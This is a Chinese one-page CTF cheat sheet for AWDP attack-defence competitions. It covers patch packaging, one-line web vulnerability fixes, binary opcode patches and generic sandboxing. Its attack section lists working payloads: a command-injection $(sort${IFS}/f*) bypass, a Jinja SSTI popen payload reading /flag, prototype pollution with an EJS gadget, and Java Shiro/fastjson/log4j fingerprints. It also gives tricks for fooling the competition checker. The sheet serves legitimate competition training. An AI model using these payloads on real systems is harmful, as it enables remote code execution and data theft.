# AWDP 一页纸（打印版）

> 打印这张带走。详细版在对应章节目录。

## 决策（防御，拿到题先问三句）

规则严吗？→ 严 = **真修复**（最小改动/hexdiff/长度一致全是禁歪招信号）
判据是啥？→ 读到 flag = **动 flag**（chmod 000 /flag，1 分钟）；执行证据 = **通防对判据调**
看不懂？→ 先交 chmod 探判据，输了不亏，再上通防兜底

## 交包铁律

① 手动过功能再交（误杀 SLA=判负） ② 幂等+`|| true` ③ 路径与题面一字不差
④ 单文件名别打错（pacth.sh 翻车实录） ⑤ 交前 `tools/lint_package.sh 包名`

## 包格式

```
web: update.tar.gz = update.sh + 修复文件     pwn: update.tar.gz = update.sh + 二进制(mv+chmod 755)
重启片段: php=apachectl -k graceful || true   flask=touch /app/app.py   node=kill+nohup拉起
```

## Web 最快修复（sink 前加闸 / 换安全写法）

| 漏洞 | 一行修复 |
|---|---|
| SQLi | 预编译参数化（PDO/execute(?,)） |
| 命令注入 | `escapeshellarg` / `shell=False` 数组传参 |
| SSTI | 模板与数据分离：`render_template_string(TPL, name=输入)` |
| LFI | `basename`+`realpath` 前缀白名单 |
| 反序列化/原型污染 | 禁入口；deepMerge 挡 `__proto__`/`constructor`/`prototype` **三键全挡** |
| XSS | 转义（模板自动转义/`htmlspecialchars`） |

通防挂载点：PHP=`auto_prepend_file` Python=`sitecustomize` hook wsgi_app Node=Express 中间件 → `tools/waf-*.sh`

## Pwn patch 速查

| 漏洞 | 改法 |
|---|---|
| 整数溢出 | 有符号跳转→无符号：jle(7E)→jbe(76)、jl(7C)→jb(72) |
| 栈溢出 | read 长度立即数改小（x86: push imm+NOP 对齐） |
| 格式化串 | call printf@plt 的目标地址换 puts@plt |
| UAF | 劫持 call free → stub: free 完把指针置零 |
| 后门 | 入口 1 字节 C3（或 call system 处 5×90） |
| canary 泄露 | jz↔jnz（74↔75）反转 |

机器码：74 jz / 75 jnz / 76 jbe / 7E jle / EB jmp；`tools/elf-patch.py <bin> --vaddr 0x.. --expect 原字节 --hex 新字节`（expect 校验防改错地方）

## Pwn 通防（规则空白处）

```
sandbox: ./tools/pwn-package.sh sandbox pwn01        # 挡execve(SLA稳)；SBOX=02 再挡open(服务别自己读文件)
偏方: alarm(60)→alarm(3) 时间差骗checker；free@plt 1字节C3 堵堆题(非通杀)
```

## 攻击 payload 骨架

```
命令注入: $(sort${IFS}/f*)   echo${IFS}sn1""per(探测标记)   注意: dash重定向不展开glob、${IFS}代空格
SSTI: {{7*7}}探测 → {{lipsum.__globals__['o'+'s'].popen('cat /flag').read()}}
原型污染: {"__proto__":{"k":"v"}} 金丝雀 → EJS outputFunctionName gadget(<3.1.8)
Java五特征: rememberMe=deleteMe=shiro  @type=fastjson  ${jndi}=log4j  rO0AB/aced0005=原生反序列化  /actuator=spring
  → tools/java_probe.py http://host/ 一轮打完，15分钟赌不中撤
开源题: dockerfile/package.json 认版本 → diff -r 本地官方源码，改动处=漏洞
```

## 四小时节奏

0-20min 三线并发（攻击自动化踩点/防御全题保底包/Java+开源diff）→ 1h 内签到全收 →
中档 30min 止损 → 组件脸 15min 赌 → 最后 1h 只留能出的，其余复查防御落袋

## 踩过的坑（别人的血泪+我们的实测）

- 通防副作用（ini/sitecustomize/注入代码/flag权限）**不在平台回滚范围**，记录怎么拆
- Flask reloader：kill 子进程→父进程跟退→容器重启→判崩。用 touch
- RCE payload 无条件自清理：读 flag 失败也必须清污染键，否则反噬自己 SLA
- rm 删 flag 轮换平台会复活，chmod 000 权限位活得过轮换
- pwn 通防挡 clone：fork 型服务当场全灭；挡 open：服务自己读文件也死
